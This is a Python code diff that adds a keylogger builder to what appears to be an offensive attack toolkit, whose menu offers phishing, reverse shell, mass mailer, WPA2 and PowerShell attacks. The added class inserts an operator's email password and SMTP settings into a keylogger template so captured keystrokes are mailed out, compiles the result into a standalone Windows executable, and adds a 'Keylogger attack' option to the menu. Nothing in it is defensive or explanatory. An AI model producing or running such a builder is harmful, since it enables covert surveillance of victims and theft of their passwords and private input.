@@ -227,6 +227,64 @@ class metasploit_generator():
             print("Could not start listener")
 
 
+class keylogger_generator():
+    def __init__(self):
+
+        self.keylogger_output_location = input("Please enter the output location: ")
+
+
+        self.keylogger_email = input("Please type your email address: ")
+        self.keylogger_password = input("Please enter your email password: ")
+        self.keylogger_smtp_server_address = input("Please enter your smtp server address: ")
+        self.keylogger_smtp_server_port = input("Please enter your smtp server port: ")
+        self.keylogger_character_limit = input("Please enter the character limit per mail: ")
+
+        self.personalise_file()
+
+    def replace_string_in_file(self, filename, inputstring, outputstring):
+        # Read in the file
+        with open(filename, 'r') as file:
+            filedata = file.read()
+
+        # Replace the target string
+        filedata = filedata.replace(inputstring, outputstring)
+
+        # Write the file out again
+        with open(filename, 'w') as file:
+            file.write(filedata)
+
+    def personalise_file(self):
+
+
+        copy_file_name = self.keylogger_output_location
+        print(copy_file_name)
+
+        self.complete_file_name = copy_file_name + "/keylogger.py"
+
+        self.cd_name = copy_file_name
+
+        os.mkdir(copy_file_name)
+        shutil.copy("keylogger/keylogger.py", copy_file_name)
+
+        self.replace_string_in_file(self.complete_file_name, "<paste_email_here>", self.keylogger_email)
+        self.replace_string_in_file(self.complete_file_name, "<paste_password_here>", self.keylogger_password)
+        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_address_here>", self.keylogger_smtp_server_address)
+        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_port_here>", self.keylogger_smtp_server_port)
+        self.replace_string_in_file(self.complete_file_name, "<paste_char_limit_here>", self.keylogger_character_limit)
+
+        ask_conv_to_exe = input("Ok: The generation was successful. Do you want to generate an .exe file? (y/n): ")
+
+        if ask_conv_to_exe == "y" or ask_conv_to_exe == "Y":
+            self.convert_to_exe()
+        else:
+            quit("Ok. Have a nice day. Bye!")
+
+    def convert_to_exe(self):
+            os.system("cd " + self.cd_name)
+            time.sleep(2)
+            os.system("python -m PyInstaller --onefile " + self.complete_file_name)
+
+            print("---- Complete ----")
 
 
 def mail_attack():
@@ -251,9 +309,10 @@ def main_menu():
     print("")
     print("1) Website phishing attack")
     print("2) Reverse shell attack")
-    print("3) Mass Mailer attacks")
-    print("4) WLAN Attack (WPA2)")
-    print("5) Powershell attack")
+    print("3) Keylogger attack")
+    print("4) Mass Mailer attacks")
+    print("5) WLAN Attack (WPA2)")
+    print("6) Powershell attack")
     print("")
     print("99) Exit")
 
@@ -264,10 +323,12 @@ def main_menu():
     elif choose_attack == 2:
         metasploit_generator()
     elif choose_attack == 3:
-        mail_attack()
+        keylogger_generator()
     elif choose_attack == 4:
-        wlan_attack()
+        mail_attack()
     elif choose_attack == 5:
+        wlan_attack()
+    elif choose_attack == 6:
         powershell_attack()
     elif choose_attack == 99:
         quit("Bye!")
